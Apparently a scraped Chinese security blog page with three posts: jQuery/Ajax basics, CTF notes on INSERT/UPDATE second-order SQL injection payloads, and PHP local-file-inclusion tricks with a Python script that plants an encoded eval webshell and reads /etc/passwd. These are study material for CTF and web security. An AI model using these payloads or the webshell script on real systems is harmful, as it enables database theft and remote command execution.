<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"p"</span>).hide(<span class="string">"slow"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		alert(<span class="string">"段落现在被隐藏了"</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>callback函数在隐藏效果完全实现后进行调用。</p>
<h4 id="JQuery获取内容"><a href="#JQuery获取内容" class="headerlink" title="JQuery获取内容"></a>JQuery获取内容</h4><p>三个简单实用的用于 DOM 操作的 jQuery 方法：</p>
<ul>
<li>text() - 设置或返回所选元素的文本内容</li>
<li>html() - 设置或返回所选元素的内容（包括 HTML 标记）</li>
<li>val() - 设置或返回表单字段的值</li>
</ul>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $(<span class="string">"#btn1"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">"Text: "</span> + $(<span class="string">"#test"</span>).text());</span><br><span class="line">  &#125;);</span><br><span class="line">  $(<span class="string">"#btn2"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">"HTML: "</span> + $(<span class="string">"#test"</span>).html());  <span class="comment">//设置内容直接在html()中添加，例如 html('lihuaiqiu')</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="JQuery获取属性"><a href="#JQuery获取属性" class="headerlink" title="JQuery获取属性"></a>JQuery获取属性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert($(<span class="string">"#runoob"</span>).attr(<span class="string">"href"</span>)); <span class="comment">//同样可设置属性 attr("href","xxx")</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="JQuery添加-删除元素"><a href="#JQuery添加-删除元素" class="headerlink" title="JQuery添加/删除元素"></a>JQuery添加/删除元素</h4><ul>
<li>append() - 在被选元素的结尾插入内容</li>
<li>prepend() - 在被选元素的开头插入内容</li>
<li>after() - 在被选元素之后插入内容</li>
<li>before() - 在被选元素之前插入内容</li>
<li>remove() - 删除被选元素（及其子元素）</li>
<li>empty() - 从被选元素中删除子元素</li>
</ul>
<h4 id="JQuery操作css"><a href="#JQuery操作css" class="headerlink" title="JQuery操作css"></a>JQuery操作css</h4><ul>
<li>addClass() - 向被选元素添加一个或多个类</li>
<li>removeClass() - 从被选元素删除一个或多个类</li>
<li>toggleClass() - 对被选元素进行添加/删除类的切换操作</li>
<li>css() - 设置或返回样式属性</li>
</ul>
<h4 id="JQuery遍历"><a href="#JQuery遍历" class="headerlink" title="JQuery遍历"></a>JQuery遍历</h4><p><a href="https://www.runoob.com/jquery/jquery-traversing.html" target="_blank" rel="noopener">https://www.runoob.com/jquery/jquery-traversing.html</a></p>
<h4 id="JQuery与Ajax"><a href="#JQuery与Ajax" class="headerlink" title="JQuery与Ajax"></a>JQuery与Ajax</h4><p><strong>load方法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(selector).load(URL,data,callback);</span><br></pre></td></tr></table></figure>

<p>必需的 <em>URL</em> 参数规定您希望加载的 URL。</p>
<p>可选的 <em>data</em> 参数规定与请求一同发送的查询字符串键/值对集合。</p>
<p>可选的 <em>callback</em> 参数是 load() 方法完成后所执行的函数名称。</p>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"#div1"</span>).load(<span class="string">"demo_test.txt"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">responseTxt,statusTxt,xhr</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(statusTxt==<span class="string">"success"</span>)</span><br><span class="line">		alert(<span class="string">"外部内容加载成功!"</span>);</span><br><span class="line">	<span class="keyword">if</span>(statusTxt==<span class="string">"error"</span>)</span><br><span class="line">		alert(<span class="string">"Error: "</span>+xhr.status+<span class="string">": "</span>+xhr.statusText);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>function即为所选的回调函数。</p>
<ul>
<li><em>responseTxt</em> - 包含调用成功时的结果内容</li>
<li><em>statusTXT</em> - 包含调用的状态</li>
<li><em>xhr</em> - 包含 XMLHttpRequest 对象</li>
</ul>
<p><strong>GET方法</strong></p>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = $(<span class="string">"#name"</span>).val();</span><br><span class="line">    $.<span class="keyword">get</span>("xxx.php", &#123;</span><br><span class="line">    	<span class="string">"act"</span>: name</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">data, status</span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (status) &#123;alert(data);&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>data为返回的数据，status为状态。其实大多数都是去用规定的函数去处理返回的JSON数据，毕竟JSON+xml才是最常见的数据传输方式。JQuery同样有处理JSON的方法，实例如下</p>
<p><img src="https://s2.ax1x.com/2019/07/18/ZXGiwV.png" alt="ZXGiwV.png"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.getJSON(<span class="string">"xxx.php"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data, status</span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (status)&#123;</span><br><span class="line">    		$(<span class="string">"div"</span>).html(data.name + <span class="string">' | '</span> + data.url + <span class="string">' | '</span> + data.PR);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以对象的形式来调用返回的JSON值。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.runoob.com/" target="_blank" rel="noopener">https://www.runoob.com</a></p>
<p><a href="https://www.leavesongs.com/HTML/begin-jquery-ajax.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/begin-jquery-ajax.html</a></p>
<p><a href="http://www.w3school.com.cn/" target="_blank" rel="noopener">http://www.w3school.com.cn/</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" data-id="ckabsu395003hkkvr8x6z08yh" class="article-share-link" data-share="baidu" data-title="前端安全学习笔记(一)-基础知识">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-深入探索insert注入与update注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/16/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2insert%E6%B3%A8%E5%85%A5%E4%B8%8Eupdate%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2019-07-16T04:39:13.000Z" itemprop="datePublished">2019-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/16/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2insert%E6%B3%A8%E5%85%A5%E4%B8%8Eupdate%E6%B3%A8%E5%85%A5/">深入探索insert注入与update注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近总是遇到一些<code>insert,update</code>类型二次注入，下面就来简单的总结一下，内容也不是很多，<code>insert与update</code>类似，下面只以<code>insert</code>为例。</p>
<h3 id="闭合单引号类型"><a href="#闭合单引号类型" class="headerlink" title="闭合单引号类型"></a>闭合单引号类型</h3><h4 id="单纯的本位闭合"><a href="#单纯的本位闭合" class="headerlink" title="单纯的本位闭合"></a>单纯的本位闭合</h4><p>什么是本位闭合呢，这应该算是我自己取的名字吧。如下是一个简单的insert语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ctf_test(`user`,`pwd`) values(<span class="string">'1'</span>,<span class="string">'2'</span>);</span><br></pre></td></tr></table></figure>

<p>当我们可以控制数字<code>1</code>的时候，我们有两种选择，第一种是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' or if(1=1,sleep(3),1) or '</span></span><br></pre></td></tr></table></figure>

<p>第二种是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">',user())#</span></span><br></pre></td></tr></table></figure>

<p>这种方法可以注释掉原来不可以控制的第二位数据，使得第二位由我们来控制。那么我们称<strong>第一种为”本位闭合”，第二种为”非本位闭合”</strong>。</p>
<p>单纯的本位闭合一般都有什么较好的测试姿势呢？<br><strong>其实一般单纯的本位闭合的原因是因为逗号的过滤，不然其实非本位闭合，可以获得更多的数据，有更高的效率。</strong></p>
<p>盲注检测姿势(网鼎杯unfinish)</p>
<p>在闭合单引号型二次注入，检测payload为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' or (case when 1=1 then sleep(3) else '</span><span class="number">2</span><span class="string">' end)='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>成功延时3s发现注入成功。</p>
<p>或许利用我们之前学到的姿势</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">'+(select hex(hex(database())))+'</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>将得到的数字进行两遍hex解码，为了不精度丢失，尽量利用<code>substr</code>提取字符串分段双hex。</p>
<h4 id="非本位闭合"><a href="#非本位闭合" class="headerlink" title="非本位闭合"></a>非本位闭合</h4><p>非本位闭合之前有介绍过，还是拿上面的这段payload。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ctf_test(`user`,`pwd`) values(<span class="string">'1'</span>,<span class="string">'2'</span>);</span><br></pre></td></tr></table></figure>

<p>如果页面的回显是只对<code>pwd</code>进行显示，而不对<code>user</code>字段进行显示该怎么操作，这时候非本位就有很大的作用了。</p>
<p>如：在1的数据位置上写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;,(select database()))#</span><br></pre></td></tr></table></figure>

<p>这样就可以在他能显示的位置上拿到我们想要的数据了。</p>
<p><strong>(PS:这里反引号其实也是可以闭合的)</strong></p>
<h4 id="特殊情况-多行insert注入"><a href="#特殊情况-多行insert注入" class="headerlink" title="特殊情况(多行insert注入)"></a>特殊情况(多行insert注入)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure>

<p>如果这个数据的回显位在<code>content</code>处，而我们能二次注入的点在<code>category</code>处，我们还能通过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">',content=user()#</span></span><br></pre></td></tr></table></figure>

<p>这种操作达到二次注入的目的吗，<strong>答案是不能的</strong>，因为<code>#</code>是单行注释，而这里的注入语句是分行的，所以正常的非本位注入无法达到类似的目的，所以这里进行的是多行注释操作。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category=<span class="string">' ,content=user(),/*content=*/#</span></span><br></pre></td></tr></table></figure>

<p><a href="https://s2.ax1x.com/2019/07/13/Z4CXbn.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/13/Z4CXbn.png" alt="Z4CXbn.png"></a></p>
<h3 id="非闭合单引号"><a href="#非闭合单引号" class="headerlink" title="非闭合单引号"></a>非闭合单引号</h3><p>其实这种情况和数字型注入差不多，只不过这里绕过的操作很多。</p>
<p>当对我的输入进行<code>is_numeric</code>进行判断时，我们可以用十六进制绕过，最终<code>select</code>查询时仍然会造成二次注入。</p>
<p>当过滤掉了<code>0x</code>时，我们可以用<code>char</code>函数，<code>char</code>出我们想要的字符进行绕过。</p>
<h3 id="insert多条记录插入注入"><a href="#insert多条记录插入注入" class="headerlink" title="insert多条记录插入注入"></a>insert多条记录插入注入</h3><p>这是一个很有趣的注入，首先来看一下所用的基本原理。</p>
<p><img src="https://s2.ax1x.com/2019/07/16/Z74eJA.png" alt="Z74eJA.png"></p>
<p>从图中可以看到我们可以利用<code>insert</code>来插入多条数据，那么这种利用的条件发生在哪呢？</p>
<p>例如我们有这样四个字段<code>id,password,content,user</code>，<strong><code>content</code>字段为可控字段，而且必须user符合我们现在的登陆账户才能插入进入数据</strong>，如果我们还是用传统的操作注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">',user())#</span></span><br></pre></td></tr></table></figure>

<p>这样肯定是不会生效的，因为我们的user()不符合，那怎么样才能达到注入的目的呢，这时就要用到我们的<code>多记录插入</code>了,payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">',user()),('</span><span class="number">1</span><span class="string">','</span><span class="number">2</span><span class="string">',user(),'</span>lihuaiqiu<span class="string">')</span></span><br></pre></td></tr></table></figure>

<p>最终成功得到注入结果，其实也可以用盲注，写个脚本，一样可以跑出来。</p>
<p><img src="https://s2.ax1x.com/2019/07/16/Z752NQ.png" alt="Z752NQ.png"></p>
<h3 id="二次注入tips"><a href="#二次注入tips" class="headerlink" title="二次注入tips"></a>二次注入tips</h3><ul>
<li>在有报错信息的情况下，可以通过注入<code>1\</code>来快速判断需要闭合的是哪种符号。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/16/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2insert%E6%B3%A8%E5%85%A5%E4%B8%8Eupdate%E6%B3%A8%E5%85%A5/" data-id="ckabsu39b0040kkvrdjhpgc7o" class="article-share-link" data-share="baidu" data-title="深入探索insert注入与update注入">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/16/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2insert%E6%B3%A8%E5%85%A5%E4%B8%8Eupdate%E6%B3%A8%E5%85%A5/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-一些有趣的LFI姿势" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/16/%E4%B8%80%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84LFI%E5%A7%BF%E5%8A%BF/" class="article-date">
  <time datetime="2019-07-16T04:14:05.000Z" itemprop="datePublished">2019-07-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/16/%E4%B8%80%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84LFI%E5%A7%BF%E5%8A%BF/">一些有趣的LFI姿势</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="利用phpinfo与LFI进行getshell"><a href="#利用phpinfo与LFI进行getshell" class="headerlink" title="利用phpinfo与LFI进行getshell"></a>利用phpinfo与LFI进行getshell</h3><h4 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h4><p>当给<code>php</code>发送<code>POST</code>数据包的时候，如果数据包里面包含我们<code>POST</code>过去的文件时，无论服务器上的文件有无处理文件上传的逻辑，<code>PHP</code>都会将将我们<code>POST</code>的文件保存为一个临时文件，形式为<code>(/tmp/php[6个随机字符])</code>,文件名字可以在<code>$_FILES</code>这个全局变量中找到,在这个请求结束后，这个临时文件就会被删掉，<strong>即利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。</strong></p>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>其实光听上面的原理介绍我们其实就可以想到条件竞争这个有意思的漏洞，也就是<strong>在那个临时文件还未被删除的时候，通过<code>$_FILES</code>全局变量中返回的文件名来进行文件包含，执行文件的php代码，生成我们的<code>webshell</code></strong>。下面通过代码来看一下返回的这个随机文件名字</p>
<p><img src="https://s2.ax1x.com/2019/07/16/Z7okZT.png" alt="Z7okZT.png"></p>
<p>一般的文件包含页面与<code>phpinfo()</code>页面是两个页面，正常情况下，虽然我们可以发完文件得到文件名，进而去第二个页面文件包含，但是往往在得到之后，这个临时文件就被删掉了，所以造成无法包含。所以此时可以用条件竞争来<code>getshell</code>，下面引用P牛的话：</p>
<ol>
<li>发送包含了<code>webshell</code>的上传数据包给<code>phpinfo</code>页面，这个数据包的<code>header、get</code>等位置需要塞满垃圾数据</li>
<li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li>
<li>php默认的输出缓冲区大小为<code>4096</code>，可以理解为php每次返回<code>4096</code>个字节给<code>socket</code>连接</li>
<li>所以，我们直接操作原生<code>socket</code>，每次读取<code>4096</code>个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>
<li>此时，第一个数据包的<code>socket</code>连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li>
<li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终<code>getshell</code></li>
</ol>
<p>上面这部分操作实际意思也就是通过对<code>get,header</code>部分的<code>padding</code>垃圾数据，但是php的默认缓冲区只有<code>4069</code>，所以我们可以在<code>socket</code>读到临时文件名立刻去第二个页面进行文件包含，而此时php还在打印phpinfo页面的信息，临时文件并没有被删除，所以可以成功getshell，exp链接<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py。" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py。</a></p>
<p>复现过程：</p>
<p><img src="https://s2.ax1x.com/2019/07/15/ZThIfI.png" alt="ZThIfI.png"></p>
<p><code>webshell</code>成功达到了<code>/tmp/g</code>文件中，通过<code>webshell</code>进行命令执行</p>
<p><img src="https://s2.ax1x.com/2019/07/15/ZT4VAJ.png" alt="ZT4VAJ.png"></p>
<h3 id="LFI-via-SegmentFault"><a href="#LFI-via-SegmentFault" class="headerlink" title="LFI via SegmentFault"></a>LFI via SegmentFault</h3><h4 id="原理介绍-1"><a href="#原理介绍-1" class="headerlink" title="原理介绍"></a>原理介绍</h4><p>首先在php环境下尝试运行此代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'print_r(file_get_contents("php://filter/string.strip_tags/resource=/etc/passwd"));'</span></span><br></pre></td></tr></table></figure>

<p>发现返回结果<code>Segmentation fault</code></p>
<p>这是<code>php7</code>出现的一个小<code>bug</code>,在<code>php</code>执行过程中出现<code>Segmentation fault</code>,并且在此同时去上传文件，那么临时文件就会被保存在/tmp目录下，并且不会被删除。<strong>所以我们需要上面的payload访问的同时去上传文件，这样文件就会被保存到我们的/tmp目录下，然后爆破文件名，文件包含得到shell</strong>。利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">"ip"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">"http://%s:%d"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(</span><br><span class="line">        <span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s")))&#123;echo "flag";&#125;?&gt;'</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="php无限包含自身导致getshell"><a href="#php无限包含自身导致getshell" class="headerlink" title="php无限包含自身导致getshell"></a>php无限包含自身导致getshell</h3><h4 id="原理介绍-2"><a href="#原理介绍-2" class="headerlink" title="原理介绍"></a>原理介绍</h4><p><code>php</code>对上传文件会有一个临时文件夹存放文件 文件名一般为<code>php</code>加随机几个字母 当<code>php</code>脚本执行完成一个 临时文件会被删除 但是我们让<code>php</code>产生内存溢出或某种错误时<code>php</code>会因为错误导致直接退出 临时文件就会被保存起来。然后通过爆破文件名，可再次文件包含<code>getshell</code>。</p>
<p>构造如下表单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form name=<span class="string">"upload"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"./lfi.php?file=lfi.php"</span>&gt;</span><br><span class="line">        File: &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>或者利用脚本循环请求</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">files=&#123;</span><br><span class="line">	<span class="string">'file'</span>:BytesIO(<span class="string">'&lt;?php phpinfo();?&gt;'</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">'http://127.0.0.1/lfi.php?file=lfi.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50000</span>):</span><br><span class="line">	requests.post(url=url,files=files)</span><br><span class="line">	<span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<p>最终可在<code>/tmp</code>目录下得到我们的<code>shell</code>。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://skysec.top/2019/04/08/Some-Trick-About-LFI/" target="_blank" rel="noopener">https://skysec.top/2019/04/08/Some-Trick-About-LFI/</a></p>
<p><a href="http://vinc.top/2016/08/25/php文件包含漏洞利用总结/" target="_blank" rel="noopener">http://vinc.top/2016/08/25/php文件包含漏洞利用总结/</a></p>
<p><a href="https://jsproxy.ga/-----https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">https://jsproxy.ga/-----https://www.jianshu.com/p/dfd049924258</a></p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>

      
    </div>
    <footer class="article-footer">
      
